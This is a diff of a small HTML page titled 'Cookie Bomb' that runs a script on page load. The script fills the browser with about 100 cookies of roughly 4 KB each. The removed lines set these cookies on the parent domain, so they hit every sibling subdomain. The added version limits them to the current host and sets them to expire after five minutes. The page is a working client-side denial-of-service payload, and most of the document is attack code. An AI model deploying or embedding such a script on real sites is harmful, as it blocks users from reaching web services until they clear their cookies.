@@ -1,13 +1,71 @@
+<!DOCTYPE html>
+<html>
 <head>
+  <meta charset="utf-8">
+  <title>Cookie Bomb</title>
 </head>
 <body>
-<script>
-var base_domain = document.domain.substr(document.domain.indexOf('.'));
-var pollution = Array(4000).join('a');
-for(var i=1;i<99;i++){
-    document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain;
-}
-</script>
-<h1>Cookie Bomb executed! To remove it clear your cookies.</h1>
+  <h1>Cookie Bomb Executing...</h1>
+  <p>aaaaaaaaaaaaaaah...</p>
+  <script>
+    (function () {
+      'use strict';
+
+      // Get the current subdomain (e.g., username.github.io)
+      function getCurrentSubdomain() {
+        return window.location.host; // Use full host to avoid PSL issues
+      }
+
+      // Generate a timestamp for cookie expiration (5 minutes from now)
+      function getExpirationDate() {
+        var expires = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes
+        return expires.toUTCString();
+      }
+
+      // Create a large cookie value (~4000 bytes, just under 4KB limit)
+      function generateLargeValue() {
+        var base = 'x';
+        return base + Array(3999).join('a'); // ~4000 bytes
+      }
+
+      // Set a cookie with the specified key, value, and domain
+      function setCookie(key, value, domain, expires) {
+        try {
+          document.cookie = `${key}=${encodeURIComponent(value)};path=/;domain=${domain};expires=${expires};SameSite=None;Secure`;
+        } catch (e) {
+          console.error(`Failed to set cookie ${key}:`, e);
+        }
+      }
+
+      // Main cookie bomb function
+      function deployCookieBomb() {
+        var subdomain = getCurrentSubdomain();
+        var largeValue = generateLargeValue();
+        var expires = getExpirationDate();
+        var maxCookies = 100; // Stay within typical browser limits
+
+        // Set multiple large cookies
+        for (var i = 0; i < maxCookies; i++) {
+          var key = `bomb${i}_${Date.now()}`; // Unique key to avoid overwrites
+          setCookie(key, largeValue, subdomain, expires);
+        }
+
+        // Verify cookies were set
+        var cookiesSet = document.cookie.split(';').length;
+        console.log(`Set ${cookiesSet} cookies for ${subdomain}`);
+
+        // Notify user
+        document.querySelector('h1').textContent = `Cookie Bomb Executed! (${cookiesSet} cookies set)`;
+      }
+
+      // Execute the cookie bomb
+      try {
+        deployCookieBomb();
+      } catch (e) {
+        console.error('Cookie Bomb deployment failed:', e);
+        document.querySelector('h1').textContent = 'Cookie Bomb Failed!';
+      }
+    })();
+  </script>
 </body>
-</html>`
+</html>
